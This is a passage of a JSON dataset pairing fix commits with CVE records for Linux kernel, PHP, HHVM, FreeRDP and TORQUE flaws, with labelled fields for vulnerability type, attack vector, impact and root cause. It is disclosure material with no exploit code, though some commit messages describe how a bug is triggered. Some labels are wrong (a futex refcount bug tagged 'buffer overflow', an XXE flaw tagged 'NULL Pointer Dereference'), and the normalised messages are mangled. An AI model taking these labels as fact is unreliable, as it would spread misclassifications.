[<ffffffff8113c5c1>] ? __audit_syscall_entry+0xa1\/0xc3\n[  475.148405]  [<ffffffff8197791e>] system_call_fastpath+0x16\/0x1b\n[  475.179201] Code: 00 48 85 c0 48 89 45 b8 75 02 0f 0b 48 8b 45 a0 48\n8b 3d 45 d0 b6 00 8b 40 08 89 c6 ff ce e8 d1 b0 06 00 48 85 c0 49 89 c7\n75 02 <0f> 0b 48 8b 45 b8 4c 8b 28 eb 1e 49 8d 7d 08 be 80 01 00 00 e8\n[  475.255884] RIP  [<ffffffff814681c7>]\ncontext_struct_compute_av+0xce\/0x308\n[  475.296120]  RSP <ffff8805c0ac3c38>\n[  475.328734] ---[ end trace f076482e9d754adc ]---\n\nReported-by:  Matthew Thode <mthode@mthode.org>\nSigned-off-by: Stephen Smalley <sds@tycho.nsa.gov>\nCc: stable@vger.kernel.org\nSigned-off-by: Paul Moore <pmoore@redhat.com>","summary":"The security_context_to_sid_core function in security\/selinux\/ss\/services.c in the Linux kernel before 3.13.4 allows local users to cause a denial of service (system crash) by leveraging the CAP_MAC_ADMIN capability to set a zero-length security context.","commit_message_1":"fix kernel bug on empty security context","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging the cap _ mac _ admin capability to set a zero - length security context","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"e6a623460e5fc960ac3ee9f946d3106233fd28d8","cve_id":"CVE-2014-1739","cwe_id":"CWE-200","commit_message":"[media] media-device: fix infoleak in ioctl media_enum_entities()\n\nThis fixes CVE-2014-1739.\n\nSigned-off-by: Salva Peir\u00f3 <speiro@ai2.upv.es>\nAcked-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Mauro Carvalho Chehab <m.chehab@samsung.com>","summary":"The media_device_enum_entities function in drivers\/media\/media-device.c in the Linux kernel before 3.14.6 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel memory by leveraging \/dev\/media0 read access for a MEDIA_IOC_ENUM_ENTITIES ioctl call.","commit_message_1":"fix infoleak in ioctl media_enum_entities ( ) this fix <cve_id>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging \/ dev \/ media0 read access for a media _ ioc _ enum _ entities ioctl call","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"2145e15e0557a01b9195d1c7199a1b92cb9be81f","cve_id":"CVE-2014-1738","cwe_id":"CWE-264","commit_message":"floppy: don't write kernel-only members to FDRAWCMD ioctl output\n\nDo not leak kernel-only floppy_raw_cmd structure members to userspace.\nThis includes the linked-list pointer and the pointer to the allocated\nDMA space.\n\nSigned-off-by: Matthew Daley <mattd@bugfuzz.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The raw_cmd_copyout function in drivers\/block\/floppy.c in the Linux kernel through 3.14.3 does not properly restrict access to certain pointers during processing of an FDRAWCMD ioctl call, which allows local users to obtain sensitive information from kernel heap memory by leveraging write access to a \/dev\/fd device.","commit_message_1":"do n't write kernel-only member to fdrawcmd ioctl output do not leak kernel-only floppy_raw_cmd structure member to userspace","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging write access to a \/ dev \/ fd device","Impact":"obtain sensitive information from kernel heap memory","Root Cause":"does not properly restrict access to certain pointers during processing of an fdrawcmd ioctl call","Attack Type":"local attacker"},{"commit_id":"ef87dbe7614341c2e7bfe8d32fcb7028cc97442c","cve_id":"CVE-2014-1737","cwe_id":"CWE-264","commit_message":"floppy: ignore kernel-only members in FDRAWCMD ioctl input\n\nAlways clear out these floppy_raw_cmd struct members after copying the\nentire structure from userspace so that the in-kernel version is always\nvalid and never left in an interdeterminate state.\n\nSigned-off-by: Matthew Daley <mattd@bugfuzz.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The raw_cmd_copyin function in drivers\/block\/floppy.c in the Linux kernel through 3.14.3 does not properly handle error conditions during processing of an FDRAWCMD ioctl call, which allows local users to trigger kfree operations and gain privileges by leveraging write access to a \/dev\/fd device.","commit_message_1":"ignore kernel-only member in fdrawcmd ioctl input always clear out these floppy_raw_cmd struct member after copying the entire structure from userspace so that the in-kernel version is always valid and never left in an interdeterminate state","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging write access to a \/ dev \/ fd device","Impact":"trigger kfree operations and gain privileges","Root Cause":"does not properly handle error conditions during processing of an fdrawcmd ioctl call","Attack Type":"local attacker"},{"commit_id":"2690d97ade05c5325cbf7c72b94b90d265659886","cve_id":"CVE-2014-1690","cwe_id":"CWE-119","commit_message":"netfilter: nf_nat: fix access to uninitialized buffer in IRC NAT helper\n\nCommit 5901b6be885e attempted to introduce IPv6 support into\nIRC NAT helper. By doing so, the following code seemed to be removed\nby accident:\n\n  ip = ntohl(exp->master->tuplehash[IP_CT_DIR_REPLY].tuple.dst.u3.ip);\n  sprintf(buffer, \"%u %u\", ip, port);\n  pr_debug(\"nf_nat_irc: inserting '%s' == %pI4, port %u\\n\", buffer, &ip, port);\n\nThis leads to the fact that buffer[] was left uninitialized and\ncontained some stack value. When we call nf_nat_mangle_tcp_packet(),\nwe call strlen(buffer) on excatly this uninitialized buffer. If we\nare unlucky and the skb has enough tailroom, we overwrite resp. leak\ncontents with values that sit on our stack into the packet and send\nthat out to the receiver.\n\nSince the rather informal DCC spec [1] does not seem to specify\nIPv6 support right now, we log such occurences so that admins can\nact accordingly, and drop the packet. I've looked into XChat source,\nand IPv6 is not supported there: addresses are in u32 and print\nvia %u format string.\n\nTherefore, restore old behaviour as in IPv4, use snprintf(). The\nIRC helper does not support IPv6 by now. By this, we can safely use\nstrlen(buffer) in nf_nat_mangle_tcp_packet() and prevent a buffer\noverflow. Also simplify some code as we now have ct variable anyway.\n\n  [1] http:\/\/www.irchelp.org\/irchelp\/rfc\/ctcpspec.html\n\nFixes: 5901b6be885e (\"netfilter: nf_nat: support IPv6 in IRC NAT helper\")\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nCc: Harald Welte <laforge@gnumonks.org>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The help function in net\/netfilter\/nf_nat_irc.c in the Linux kernel before 3.12.8 allows remote attackers to obtain sensitive information from kernel memory by establishing an IRC DCC session in which incorrect packet data is transmitted during use of the NAT mangle feature.","commit_message_1":"nf_nat : fix access to uninitialized buffer in irc nat helper commit 5901b6be885e attempted to introduce ipv6 support into irc nat helper","Vulnerability Type":"buffer overflow","Attack Vector":"by establishing an irc dcc session in which incorrect packet data is transmitted during use of the nat mangle feature","Impact":"obtain sensitive information from kernel memory","Root Cause":"built with the NetFilter Connection Tracking(NF_CONNTRACK) support for IRC protocol(NF_NAT_IRC)","Attack Type":"remote attacker"},{"commit_id":"8e3fbf870481eb53b2d3a322d1fc395ad8b367ed","cve_id":"CVE-2014-1446","cwe_id":"CWE-399","commit_message":"hamradio\/yam: fix info leak in ioctl\n\nThe yam_ioctl() code fails to initialise the cmd field\nof the struct yamdrv_ioctl_cfg. Add an explicit memset(0)\nbefore filling the structure to avoid the 4-byte info leak.\n\nSigned-off-by: Salva Peir\u00f3 <speiro@ai2.upv.es>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The yam_ioctl function in drivers\/net\/hamradio\/yam.c in the Linux kernel before 3.12.8 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability for an SIOCYAMGCFG ioctl call.","commit_message_1":"fix info leak in ioctl the yam_ioctl ( ) code fails to initialise the cmd field of the struct yamdrv_ioctl_cfg","Vulnerability Type":"Resource Management Errors","Attack Vector":"by leveraging the cap _ net _ admin capability for an siocyamgcfg ioctl call","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize a certain structure member","Attack Type":"local attacker"},{"commit_id":"2b13d06c9584b4eb773f1e80bbaedab9a1c344e1","cve_id":"CVE-2014-1445","cwe_id":"CWE-399","commit_message":"wanxl: fix info leak in ioctl\n\nThe wanxl_ioctl() code fails to initialize the two padding bytes of\nstruct sync_serial_settings after the ->loopback member. Add an explicit\nmemset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peir\u00f3 <speiro@ai2.upv.es>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The wanxl_ioctl function in drivers\/net\/wan\/wanxl.c in the Linux kernel before 3.11.7 does not properly initialize a certain data structure, which allows local users to obtain sensitive information from kernel memory via an ioctl call.","commit_message_1":"fix info leak in ioctl the wanxl_ioctl ( ) code fails to initialize the two padding byte of struct sync_serial_settings after the - > loopback member","Vulnerability Type":"Resource Management Errors","Attack Vector":"via an ioctl call","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not properly initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"96b340406724d87e4621284ebac5e059d67b2194","cve_id":"CVE-2014-1444","cwe_id":"CWE-399","commit_message":"farsync: fix info leak in ioctl\n\nThe fst_get_iface() code fails to initialize the two padding bytes of\nstruct sync_serial_settings after the ->loopback member. Add an explicit\nmemset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The fst_get_iface function in drivers\/net\/wan\/farsync.c in the Linux kernel before 3.11.7 does not properly initialize a certain data structure, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability for an SIOCWANDEV ioctl call.","commit_message_1":"fix info leak in ioctl the fst_get_iface ( ) code fails to initialize the two padding byte of struct sync_serial_settings after the - > loopback member","Vulnerability Type":"Resource Management Errors","Attack Vector":"by leveraging the cap _ net _ admin capability for an siocwandev ioctl call","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not properly initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"95f96e7287effe2fcdfb9a5338d1a7e4f55b083b","cve_id":"CVE-2014-1439","cwe_id":null,"commit_message":"Fix libxml_disable_entity_loader()\n\nThis wasn't calling requestInit and setting the libxml handler no null.\nSo the first time an error came along it would reset the handler from\nno-op to reading again.\n\nThis is a much better fix, we set our custom handler in requestInit and\nwhen libxml_disable_entity_loader we store that state as a member bool\nensuring requestInit is always called to set our own handler.\n\nIf the handler isn't inserted then the behavious is as before. The only\ntime this could go pear shaped is say we wanted to make the default be\noff. In that case we'd need a global requestInit that is always called\nsince there are libxml references everywhere.\n\nReviewed By: @jdelong\n\nDifferential Revision: D1116686","summary":"The libxml_disable_entity_loader function in runtime\/ext\/ext_simplexml.cpp in HipHop Virtual Machine for PHP (HHVM) before 2.4.0 and 2.3.x before 2.3.3 does not properly disable a certain libxml handler, which allows remote attackers to conduct XML External Entity (XXE) attacks.","commit_message_1":"fix libxml_disable_entity_loader ( ) this wa n't calling requestinit and setting the libxml handler no null","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"conduct XML External Entity (XXE) attacks","Impact":"conduct xml external entity ( xxe ) attacks","Root Cause":"does not properly disable a certain libxml handler","Attack Type":"remote attacker"},{"commit_id":"26bef1318adc1b3a530ecc807ef99346db2aa8b0","cve_id":"CVE-2014-1438","cwe_id":"CWE-264","commit_message":"x86, fpu, amd: Clear exceptions in AMD FXSAVE workaround\n\nBefore we do an EMMS in the AMD FXSAVE information leak workaround we\nneed to clear any pending exceptions, otherwise we trap with a\nfloating-point exception inside this code.\n\nReported-by: halfdog <me@halfdog.net>\nTested-by: Borislav Petkov <bp@suse.de>\nLink: http:\/\/lkml.kernel.org\/r\/CA%2B55aFxQnY_PCG_n4=0w-VG=YLXL-yr7oMxyy0WU2gCBAf3ydg@mail.gmail.com\nSigned-off-by: H. Peter Anvin <hpa@zytor.com>","summary":"The restore_fpu_checking function in arch\/x86\/include\/asm\/fpu-internal.h in the Linux kernel before 3.12.8 on the AMD K7 and K8 platforms does not clear pending exceptions before proceeding to an EMMS instruction, which allows local users to cause a denial of service (task kill) or possibly gain privileges via a crafted application.","commit_message_1":"clear exception in amd fxsave workaround before we do an emms in the amd fxsave information leak workaround we need to clear any pending exception , otherwise we trap with a floating-point exception inside this code","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( task kill ) or possibly gain privileges","Root Cause":"does not clear pending exceptions before proceeding to an emms instruction","Attack Type":"local attacker"},{"commit_id":"e2745807c4c3e0a590c0f69a9b655dc74ebaa03e","cve_id":"CVE-2014-0791","cwe_id":"CWE-189","commit_message":"Fix possible integer overflow in license_read_scope_list()","summary":"Integer overflow in the license_read_scope_list function in libfreerdp\/core\/license.c in FreeRDP through 1.0.2 allows remote RDP servers to cause a denial of service (application crash) or possibly have unspecified other impact via a large ScopeCount value in a Scope List in a Server License Request packet.","commit_message_1":"fix possible integer overflow in license_read_scope_list ( )","Vulnerability Type":"integer overflow","Attack Vector":"via a large scopecount value in a scope list in a server license request packet","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"3ed749263abe3d69fa3626d142a5789dcb5a5684","cve_id":"CVE-2014-0749","cwe_id":"CWE-119","commit_message":"Merge pull request #171 into 2.5-fixes.","summary":"Stack-based buffer overflow in lib\/Libdis\/disrsi_.c in Terascale Open-Source Resource and Queue Manager (aka TORQUE Resource Manager) 2.5.x through 2.5.13 allows remote attackers to execute arbitrary code via a large count value.","commit_message_1":"merge pull request # <number> into <file>-fixes","Vulnerability Type":"buffer overflow","Attack Vector":"via a large count value","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by the pbs_server component","Attack Type":"remote attacker"},{"commit_id":"f97486ef5dc3e8735440edc4fc8808c63e1a3ef0","cve_id":"CVE-2014-0238","cwe_id":"CWE-119","commit_message":"CVE-2014-0207: Prevent 0 element vectors and vectors longer than the number\nof properties from accessing random memory.","summary":"The cdf_read_property_info function in cdf.c in the Fileinfo component in PHP before 5.4.29 and 5.5.x before 5.5.13 allows remote attackers to cause a denial of service (infinite loop or out-of-bounds memory access) via a vector that (1) has zero length or (2) is too long.","commit_message_1":"prevent <number> element vector and vector longer than the number of property from accessing random memory","Vulnerability Type":"buffer overflow","Attack Vector":"via a vector that ( 1 ) has zero length or ( 2 ) is too long","Impact":"cause a denial of service ( infinite loop or out - of - bounds memory access )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"b8acc83781d5a24cc5101e525d15efe0482c280d","cve_id":"CVE-2014-0237","cwe_id":"CWE-399","commit_message":"Remove loop that kept reading the same offset (Jan Kaluza)","summary":"The cdf_unpack_summary_info function in cdf.c in the Fileinfo component in PHP before 5.4.29 and 5.5.x before 5.5.13 allows remote attackers to cause a denial of service (performance degradation) by triggering many file_printf calls.","commit_message_1":"remove loop that kept reading the same offset ( jan kaluza )","Vulnerability Type":"Resource Management Errors","Attack Vector":"by triggering many file _ printf calls","Impact":"cause a denial of service ( performance degradation )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"6d209c1c489457397a5763bca4b28e43aac90391","cve_id":"CVE-2014-0207","cwe_id":"CWE-119","commit_message":"Apply patches from file-CVE-2012-1571.patch\nFrom Francisco Alonso Espejo:\n    file < 5.18\/git version can be made to crash when checking some\n    corrupt CDF files (Using an invalid cdf_read_short_sector size)\n    The problem I found here, is that in most situations (if\n    h_short_sec_size_p2 > 8) because the blocksize is 512 and normal\n    values are 06 which means reading 64 bytes.As long as the check\n    for the block size copy is not checked properly (there's an assert\n    that makes wrong\/invalid assumptions)","summary":"The cdf_read_short_sector function in cdf.c in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, allows remote attackers to cause a denial of service (assertion failure and application exit) via a crafted CDF file.","commit_message_1":"apply patch from file-<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted cdf file","Impact":"cause a denial of service ( assertion failure and application exit )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"edfbbf388f293d70bf4b7c0bc38774d05e6f711a","cve_id":"CVE-2014-0206","cwe_id":null,"commit_message":"aio: fix kernel memory disclosure in io_getevents() introduced in v3.10\n\nA kernel memory disclosure was introduced in aio_read_events_ring() in v3.10\nby commit a31ad380bed817aa25f8830ad23e1a0480fef797.  The changes made to\naio_read_events_ring() failed to correctly limit the index into\nctx->ring_pages[], allowing an attacked to cause the subsequent kmap() of\nan arbitrary page with a copy_to_user() to copy the contents into userspace.\nThis vulnerability has been assigned CVE-2014-0206.  Thanks to Mateusz and\nPetr for disclosing this issue.\n\nThis patch applies to v3.12+.  A separate backport is needed for 3.10\/3.11.\n\nSigned-off-by: Benjamin LaHaise <bcrl@kvack.org>\nCc: Mateusz Guzik <mguzik@redhat.com>\nCc: Petr Matousek <pmatouse@redhat.com>\nCc: Kent Overstreet <kmo@daterainc.com>\nCc: Jeff Moyer <jmoyer@redhat.com>\nCc: stable@vger.kernel.org","summary":"Array index error in the aio_read_events_ring function in fs\/aio.c in the Linux kernel through 3.15.1 allows local users to obtain sensitive information from kernel memory via a large head value.","commit_message_1":"fix kernel memory disclosure in io_getevents ( ) introduced in <file> a kernel memory disclosure wa introduced in aio_read_events_ring ( ) in <file> by commit a31ad380bed817aa25f8830ad23e1a0480fef797","Vulnerability Type":"array index","Attack Vector":"via a large head value","Impact":"obtain sensitive information from kernel memory","Root Cause":"caused by the failure to properly sanitize AIO ring head by the aio_read_events_ring() function","Attack Type":"local attacker"},{"commit_id":"7ada876a8703f23befbb20a7465a702ee39b1704","cve_id":"CVE-2014-0205","cwe_id":"CWE-119","commit_message":"futex: Fix errors in nested key ref-counting\n\nfutex_wait() is leaking key references due to futex_wait_setup()\nacquiring an additional reference via the queue_lock() routine. The\nnested key ref-counting has been masking bugs and complicating code\nanalysis. queue_lock() is only called with a previously ref-counted\nkey, so remove the additional ref-counting from the queue_(un)lock()\nfunctions.\n\nAlso futex_wait_requeue_pi() drops one key reference too many in\nunqueue_me_pi(). Remove the key reference handling from\nunqueue_me_pi(). This was paired with a queue_lock() in\nfutex_lock_pi(), so the count remains unchanged.\n\nDocument remaining nested key ref-counting sites.\n\nSigned-off-by: Darren Hart <dvhart@linux.intel.com>\nReported-and-tested-by: Matthieu Fertr\u00e9<matthieu.fertre@kerlabs.com>\nReported-by: Louis Rilling<louis.rilling@kerlabs.com>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Eric Dumazet <eric.dumazet@gmail.com>\nCc: John Kacur <jkacur@redhat.com>\nCc: Rusty Russell <rusty@rustcorp.com.au>\nLKML-Reference: <4CBB17A8.70401@linux.intel.com>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nCc: stable@kernel.org","summary":"The futex_wait function in kernel\/futex.c in the Linux kernel before 2.6.37 does not properly maintain a certain reference count during requeue operations, which allows local users to cause a denial of service (use-after-free and system crash) or possibly gain privileges via a crafted application that triggers a zero count.","commit_message_1":"fix error in nested key ref-counting futex_wait ( ) is leaking key reference due to futex_wait_setup ( ) acquiring an additional reference via the queue_lock ( ) routine","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted application that triggers a zero count","Impact":"cause a denial of service ( use - after - free and system crash ) or possibly gain privileges","Root Cause":"does not properly maintain a certain reference count during requeue operations","Attack Type":"local attacker"},{"commit_id":"86acdca1b63e6890540fa19495cfc708beff3d8b","cve_id":"CVE-2014-0203","cwe_id":"CWE-20","commit_message":"fix autofs\/afs\/etc. magic mountpoint breakage\n\nWe end up trying to kfree() nd.last.name on open(\"\/mnt\/tmp\", O_CREAT)\nif \/mnt\/tmp is an autofs direct mount.  The reason is that nd.last_type\nis bogus here; we want LAST_BIND for everything of that kind and we\nget LAST_NORM left over from finding parent directory.\n\nSo make sure that it *is* set properly; set to LAST_BIND before\ndoing ->follow_link() - for normal symlinks it will be changed\nby __vfs_follow_link() and everything else needs it set that way.\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The __do_follow_link function in fs\/namei.c in the Linux kernel before 2.6.33 does not properly handle the last pathname component during use of certain filesystems, which allows local users to cause a denial of service (incorrect free operations and system crash) via an open system call.","commit_message_1":"fix autofs\/afs\/etc","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an open system call","Impact":"cause a denial of service ( incorrect free operations and system crash )","Root Cause":"does not properly handle the last pathname component during use of certain filesystems","Attack Type":"local attacker"},{"commit_id":"4291086b1f081b869c6d79e5b7441633dc3ace00","cve_id":"CVE-2014-0196","cwe_id":"CWE-362","commit_message":"n_tty: Fix n_tty_write crash when echoing in raw mode\n\nThe tty atomic_write_lock does not provide an exclusion guarantee for\nthe tty driver if the termios settings are LECHO & !OPOST.  And since\nit is unexpected and not allowed to call TTY buffer helpers like\ntty_insert_flip_string concurrently, this may lead to crashes when\nconcurrect writers call pty_write. In that case the following two\nwriters:\n* the ECHOing from a workqueue and\n* pty_write from the process\nrace and can overflow the corresponding TTY buffer like follows.\n\nIf we look into tty_insert_flip_string_fixed_flag, there is:\n  int space = __tty_buffer_request_room(port, goal, flags);\n  struct tty_buffer *tb = port->buf.tail;\n  ...\n  memcpy(char_buf_ptr(tb, tb->used), chars, space);\n  ...\n  tb->used += space;\n\nso the race of the two can result in something like this:\n              A                                B\n__tty_buffer_request_room\n                                  __tty_buffer_request_room\nmemcpy(buf(tb->used), ...)\ntb->used += space;\n                                  memcpy(buf(tb->used), ...) ->BOOM\n\nB's memcpy is past the tty_buffer due to the previous A's tb->used\nincrement.\n\nSince the N_TTY line discipline input processing can output\nconcurrently with a tty write, obtain the N_TTY ldisc output_lock to\nserialize echo output with normal tty writes.  This ensures the tty\nbuffer helper tty_insert_flip_string is not called concurrently and\neverything is fine.\n\nNote that this is nicely reproducible by an ordinary user using\nforkpty and some setup around that (raw termios + ECHO). And it is\npresent in kernels at least after commit\nd945cb9cce20ac7143c2de8d88b187f62db99bdc (pty: Rework the pty layer to\nuse the normal buffering logic) in 2.6.31-rc3.\n\njs: add more info to the commit log\njs: switch to bool\njs: lock unconditionally\njs: lock only the tty->ops->write call\n\nReferences: CVE-2014-0196\nReported-and-tested-by: Jiri Slaby <jslaby@suse.cz>\nSigned-off-by: Peter Hurley <peter@hurleysoftware.com>\nSigned-off-by: Jiri Slaby <jslaby@suse.cz>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Alan Cox <alan@lxorguk.ukuu.org.uk>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The n_tty_write function in drivers\/tty\/n_tty.c in the Linux kernel through 3.14.3 does not properly manage tty driver access in the *LECHO & !OPOST* case, which allows local users to cause a denial of service (memory corruption and system crash) or gain privileges by triggering a race condition involving read and write operations with long strings.","commit_message_1":"fix n_tty_write crash when echoing in raw mode the tty atomic_write_lock doe not provide an exclusion guarantee for the tty driver if the termios setting are lecho & ! opost","Vulnerability Type":"Race Condition","Attack Vector":"by triggering a race condition involving read and write operations with long strings","Impact":"cause a denial of service ( memory corruption and system crash ) or gain privileges","Root Cause":"does not properly manage tty driver access","Attack Type":"local attacker"},{"commit_id":"1fd819ecb90cc9b822cd84d3056ddba315d3340f","cve_id":"CVE-2014-0131","cwe_id":"CWE-416","commit_message":"skbuff: skb_segment: orphan frags before copying\n\nskb_segment copies frags around, so we need\nto copy them carefully to avoid accessing\nuser memory after reporting completion to userspace\nthrough a callback.\n\nskb_segment doesn't normally happen on datapath:\nTSO needs to be disabled - so disabling zero copy\nin this case does not look like a big deal.\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nAcked-by: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Use-after-free vulnerability in the skb_segment function in net\/core\/skbuff.c in the Linux kernel through 3.13.6 allows attackers to obtain sensitive information from kernel memory by leveraging the absence of a certain orphaning operation.","commit_message_1":"skb_segment : orphan frags before copying skb_segment copy frags around , so we need to copy them carefully to avoid accessing user memory after reporting completion to userspace through a callback","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging the absence of a certain orphaning operation","Impact":"obtain sensitive information from kernel memory","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"ec0223ec48a90cb605244b45f7c62de856403729","cve_id":"CVE-2014-0101","cwe_id":"CWE-20","commit_message":"net: sctp: fix sctp_sf_do_5_1D_ce to verify if we\/peer is AUTH capable\n\nRFC4895 introduced AUTH chunks for SCTP; during the SCTP\nhandshake RANDOM; CHUNKS; HMAC-ALGO are negotiated (CHUNKS\nbeing optional though):\n\n  ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->\n  <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------\n  -------------------- COOKIE-ECHO -------------------->\n  <-------------------- COOKIE-ACK ---------------------\n\nA special case is when an endpoint requires COOKIE-ECHO\nchunks to be authenticated:\n\n  ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->\n  <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------\n  ------------------ AUTH; COOKIE-ECHO ---------------->\n  <-------------------- COOKIE-ACK ---------------------\n\nRFC4895, section 6.3. Receiving Authenticated Chunks says:\n\n  The receiver MUST use the HMAC algorithm indicated in\n  the HMAC Identifier field. If this algorithm was not\n  specified by the receiver in the HMAC-ALGO parameter in\n  the INIT or INIT-ACK chunk during association setup, the\n  AUTH chunk and all the chunks after it MUST be discarded\n  and an ERROR chunk SHOULD be sent with the error cause\n  defined in Section 4.1. [...] If no endpoint pair shared\n  key has been configured for that Shared Key Identifier,\n  all authenticated chunks MUST be silently discarded. [...]\n\n  When an endpoint requires COOKIE-ECHO chunks to be\n  authenticated, some special procedures have to be followed\n  because the reception of a COOKIE-ECHO chunk might result\n  in the creation of an SCTP association. If a packet arrives\n  containing an AUTH chunk as a first chunk, a COOKIE-ECHO\n  chunk as the second chunk, and possibly more chunks after\n  them, and the receiver does not have an STCB for that\n  packet, then authentication is based on the contents of\n  the COOKIE-ECHO chunk. In this situation, the receiver MUST\n  authenticate the chunks in the packet by using the RANDOM\n  parameters, CHUNKS parameters and HMAC_ALGO parameters\n  obtained from the COOKIE-ECHO chunk, and possibly a local\n  shared secret as inputs to the authentication procedure\n  specified in Section 6.3. If authentication fails, then\n  the packet is discarded. If the authentication is successful,\n  the COOKIE-ECHO and all the chunks after the COOKIE-ECHO\n  MUST be processed. If the receiver has an STCB, it MUST\n  process the AUTH chunk as described above using the STCB\n  from the existing association to authenticate the\n  COOKIE-ECHO chunk and all the chunks after it. [...]\n\nCommit bbd0d59809f9 introduced the possibility to receive\nand verification of AUTH chunk, including the edge case for\nauthenticated COOKIE-ECHO. On reception of COOKIE-ECHO,\nthe function sctp_sf_do_5_1D_ce() handles processing,\nunpacks and creates a new association if it passed sanity\nchecks and also tests for authentication chunks being\npresent. After a new association has been processed, it\ninvokes sctp_process_init() on the new association and\nwalks through the parameter list it received from the INIT\nchunk. It checks SCTP_PARAM_RANDOM, SCTP_PARAM_HMAC_ALGO\nand SCTP_PARAM_CHUNKS, and copies them into asoc->peer\nmeta data (peer_random, peer_hmacs, peer_chunks) in case\nsysctl -w net.sctp.auth_enable=1 is set. If in INIT's\nSCTP_PARAM_SUPPORTED_EXT parameter SCTP_CID_AUTH is set,\npeer_random != NULL and peer_hmacs != NULL the peer is to be\nassumed asoc->peer.auth_capable=1, in any other case\nasoc->peer.auth_capable=0.\n\nNow, if in sctp_sf_do_5_1D_ce() chunk->auth_chunk is\navailable, we set up a fake auth chunk and pass that on to\nsctp_sf_authenticate(), which at latest in\nsctp_auth_calculate_hmac() reliably dereferences a NULL pointer\nat position 0..0008 when setting up the crypto key in\ncrypto_hash_setkey() by using asoc->asoc_shared_key that is\nNULL as condition key_id == asoc->active_key_id is true if\nthe AUTH chunk was injected correctly from remote. This\nhappens no matter what net.sctp.auth_enable sysctl says.\n\nThe fix is to check for net->sctp.auth_enable and for\nasoc->peer.auth_capable before doing any operations like\nsctp_sf_authenticate() as no key is activated in\nsctp_auth_asoc_init_active_key() for each case.\n\nNow as RFC4895 section 6.3 states that if the used HMAC-ALGO\npassed from the INIT chunk was not used in the AUTH chunk, we\nSHOULD send an error; however in this case it would be better\nto just silently discard such a maliciously prepared handshake\nas we didn't even receive a parameter at all. Also, as our\nendpoint has no shared key configured, section 6.3 says that\nMUST silently discard, which we are doing from now onwards.\n\nBefore calling sctp_sf_pdiscard(), we need not only to free\nthe association, but also the chunk->auth_chunk skb, as\ncommit bbd0d59809f9 created a skb clone in that case.\n\nI have tested this locally by using netfilter's nfqueue and\nre-injecting packets into the local stack after maliciously\nmodifying the INIT chunk (removing RANDOM; HMAC-ALGO param)\nand the SCTP packet containing the COOKIE_ECHO (injecting\nAUTH chunk before COOKIE_ECHO). Fixed with this patch applied.\n\nFixes: bbd0d59809f9 (\"[SCTP]: Implement the receive and verification of AUTH chunk\")\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nCc: Vlad Yasevich <yasevich@gmail.com>\nCc: Neil Horman <nhorman@tuxdriver.com>\nAcked-by: Vlad Yasevich <vyasevich@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_sf_do_5_1D_ce function in net\/sctp\/sm_statefuns.c in the Linux kernel through 3.13.6 does not validate certain auth_enable and auth_capable fields before making an sctp_sf_authenticate call, which allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) via an SCTP handshake with a modified INIT chunk and a crafted AUTH chunk before a COOKIE_ECHO chunk.","commit_message_1":"sctp : fix sctp_sf_do_5_1d_ce to verify if we\/peer is auth capable rfc4895 introduced auth chunk for sctp 